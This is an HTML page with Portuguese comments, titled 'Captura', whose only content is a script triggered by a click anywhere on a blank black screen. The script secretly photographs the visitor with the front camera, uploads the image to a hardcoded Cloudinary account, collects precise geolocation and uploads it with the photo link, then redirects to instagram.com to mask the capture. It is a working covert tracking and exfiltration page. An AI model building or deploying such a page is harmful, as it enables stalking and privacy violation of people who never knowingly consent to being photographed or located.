<!DOCTYPE html>
<html lang="pt">
<head>
  <meta charset="UTF-8">
  <title>Captura</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>body{margin:0;overflow:hidden;background:#000;}</style>
</head>
<body onclick="capturarTudo()">
<script>
const cloudName = "dx5legahb"; 
const uploadPreset = "upload";
const folderName = "capturas";

async function capturarTudo() {
  if (window.started) return; // Evita m√∫ltiplas execu√ß√µes
  window.started = true;

  try {
    // üì∏ Captura a imagem da c√¢mera frontal no iPhone e Android
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" }
    });

    const video = document.createElement("video");
    video.srcObject = stream;
    video.setAttribute("playsinline", true);
    video.muted = true;
    await video.play();

    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    stream.getTracks().forEach(track => track.stop());

    const imageData = canvas.toDataURL("image/png");
    const imageBlob = await (await fetch(imageData)).blob();

    const imageForm = new FormData();
    imageForm.append("file", imageBlob);
    imageForm.append("upload_preset", uploadPreset);
    imageForm.append("folder", folderName);

    const imageResp = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, {
      method: "POST",
      body: imageForm
    });

    if (!imageResp.ok) throw new Error("Erro ao enviar imagem");
    const imageUrl = (await imageResp.json()).secure_url;

    // üìç Captura a localiza√ß√£o
    navigator.geolocation.getCurrentPosition(async (pos) => {
      const { latitude, longitude } = pos.coords;
      const texto = `Latitude: ${latitude}\nLongitude: ${longitude}\nImagem: ${imageUrl}`;
      const textBlob = new Blob([texto], { type: "text/plain" });

      const textForm = new FormData();
      textForm.append("file", textBlob, `localizacao_${Date.now()}.txt`);
      textForm.append("upload_preset", uploadPreset);
      textForm.append("folder", folderName);

      await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/raw/upload`, {
        method: "POST",
        body: textForm
      });

      window.location.href = "https://instagram.com";
    }, () => {
      // Se falhar a localiza√ß√£o, s√≥ envia a foto
      window.location.href = "https://instagram.com";
    }, {
      enableHighAccuracy: true,
      timeout: 8000
    });

  } catch (e) {
    console.error("Erro:", e);
    window.location.href = "https://instagram.com";
  }
}
</script>
</body>
</html>
